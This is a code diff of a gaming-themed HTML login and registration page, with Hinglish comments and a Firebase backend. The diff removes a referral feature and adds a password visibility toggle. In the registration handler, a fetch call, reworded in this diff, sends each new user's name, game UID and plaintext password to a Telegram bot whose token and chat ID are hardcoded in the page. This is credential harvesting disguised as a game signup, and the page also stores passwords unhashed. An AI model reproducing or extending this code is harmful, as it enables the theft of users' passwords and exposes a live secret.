@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+ <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -13,7 +13,6 @@
     <style>
         :root { --orange: #ff9900; --dark: #0f0f0f; --white: #ffffff; --success: #27ae60; }
         
-        /* 🚫 Blue Highlight & Selection Hata Diya */
         * { 
             margin: 0; padding: 0; box-sizing: border-box; outline: none; 
             -webkit-tap-highlight-color: transparent; 
@@ -66,8 +65,11 @@
         .bullet-box i { position: absolute; left: 15px; color: var(--orange); font-size: 14px; }
         .bullet-box input {
             width: 100%; height: 100%; background: transparent; border: none;
-            padding: 0 20px 0 45px; color: #fff; font-family: 'Rajdhani'; font-size: 15px;
-            user-select: text; /* Allow typing */
+            padding: 0 45px 0 45px; color: #fff; font-family: 'Rajdhani'; font-size: 15px;
+            user-select: text;
+        }
+        .eye-icon {
+            position: absolute; right: 15px; color: #666; cursor: pointer; font-size: 14px;
         }
 
         .btn-start {
@@ -76,13 +78,11 @@
             margin-top: 10px; cursor: pointer; transition: 0.2s;
             box-shadow: 0 4px 15px rgba(255, 153, 0, 0.3);
         }
-        /* ⚡ Button Animation on Click */
         .btn-start:active { transform: scale(0.95); background: #e68a00; }
 
         .forgot-link { display: inline-block; margin-top: 15px; font-size: 13px; color: #666; text-decoration: none; font-weight: 700; }
         .forgot-link span { color: var(--orange); }
 
-        /* 🛡️ Smart Custom Notice (Browser Alert Khatam) */
         #custom-notice {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: rgba(0,0,0,0.8); display: none; justify-content: center; align-items: center; z-index: 2000;
@@ -124,7 +124,11 @@
 
         <div id="login-form" class="form-area">
             <div class="bullet-box"><i class="fas fa-id-badge"></i><input type="text" id="l-uid" placeholder="GAME UID"></div>
-            <div class="bullet-box"><i class="fas fa-lock"></i><input type="password" id="l-pass" placeholder="PASSWORD"></div>
+            <div class="bullet-box">
+                <i class="fas fa-lock"></i>
+                <input type="password" id="l-pass" placeholder="PASSWORD">
+                <i class="fas fa-eye eye-icon" onclick="togglePass('l-pass', this)"></i>
+            </div>
             <button class="btn-start" onclick="handleLogin()">START BATTLE</button>
             <a href="forgot.html" class="forgot-link">Forgot Password? <span>Reset Now</span></a>
         </div>
@@ -132,9 +136,12 @@
         <div id="reg-form" class="form-area hidden">
             <div class="bullet-box"><i class="fas fa-user"></i><input type="text" id="r-name" placeholder="FULL NAME"></div>
             <div class="bullet-box"><i class="fas fa-id-card"></i><input type="text" id="r-uid" placeholder="GAME UID"></div>
-            <div class="bullet-box"><i class="fas fa-key"></i><input type="password" id="r-pass" placeholder="PASSWORD"></div>
+            <div class="bullet-box">
+                <i class="fas fa-key"></i>
+                <input type="password" id="r-pass" placeholder="PASSWORD">
+                <i class="fas fa-eye eye-icon" onclick="togglePass('r-pass', this)"></i>
+            </div>
             <div class="bullet-box"><i class="fas fa-phone"></i><input type="tel" id="r-phone" placeholder="PHONE NUMBER"></div>
-            <div class="bullet-box" style="border-right-color: var(--success);"><i class="fas fa-gift"></i><input type="text" id="r-refer" placeholder="REFER CODE (AUTO)"></div>
             <button class="btn-start" onclick="handleRegister()">JOIN SQUAD</button>
         </div>
     </div>
@@ -146,19 +153,6 @@
 
         const botToken = "8766300899:AAFbpRvQiNxLDWvJQ6NIP1JeJmrHfzDz6rE";
         const chatId = "7852788120";
-
-        // 🟢 Smart Link Detection & Tab Switching
-        window.onload = function() {
-            const urlParams = new URLSearchParams(window.location.search);
-            const ref = urlParams.get('ref');
-            
-            if (ref) {
-                // Agar Link mein refer code hai, toh seedha Register tab kholo
-                switchTab('reg', document.getElementById('tab-reg'));
-                document.getElementById('r-refer').value = ref.toUpperCase();
-                console.log("Referral Detected: " + ref);
-            }
-        };
 
         function showNotice(title, msg) {
             document.getElementById('notice-title').innerText = title;
@@ -175,12 +169,22 @@
             el.classList.add('active');
         }
 
+        function togglePass(id, el) {
+            const input = document.getElementById(id);
+            if (input.type === "password") {
+                input.type = "text";
+                el.classList.replace('fa-eye', 'fa-eye-slash');
+            } else {
+                input.type = "password";
+                el.classList.replace('fa-eye-slash', 'fa-eye');
+            }
+        }
+
         async function handleRegister() {
             const name = document.getElementById('r-name').value.trim();
             const uid = document.getElementById('r-uid').value.trim();
             const pass = document.getElementById('r-pass').value.trim();
             const phone = document.getElementById('r-phone').value.trim();
-            const referCode = document.getElementById('r-refer').value.trim();
 
             if(!name || !uid || !pass || !phone) {
                 showNotice("ERROR", "Bhai, saari details fill kar!"); return;
@@ -191,27 +195,13 @@
                 showNotice("DENIED", "Ye UID pehle se registered hai!"); return;
             }
 
-            // Referral Check
-            if(referCode !== "") {
-                const refSnap = await database.ref('users/' + referCode).once('value');
-                if(!refSnap.exists()) {
-                    showNotice("INVALID", "Refer code sahi nahi hai!"); return;
-                }
-                
-                // Referral Entry
-                await database.ref('referrals/' + referCode + '/' + uid).set({
-                    name: name, date: new Date().toLocaleDateString(), status: "Pending"
-                });
-            }
-
             await database.ref('users/' + uid).set({
                 name, uid, password: pass, phone, balance: 0,
-                referredBy: referCode || "NONE",
                 hasPlayedBefore: false,
                 joinedOn: new Date().toLocaleString()
             });
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`<b>🆕 NEW RECRUIT</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: ${pass}\n🎁 Refer: ${referCode || "NONE"}`)}&parse_mode=html`);
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(`<b>🆕 NEW RECRUIT</b>\n👤 Name: ${name}\n🆔 UID: ${uid}\n🔑 Pass: ${pass}`)}&parse_mode=html`);
             
             localStorage.setItem('gameID', uid);
             showNotice("WELCOME", "Registration Successful! Ready for Battle.");
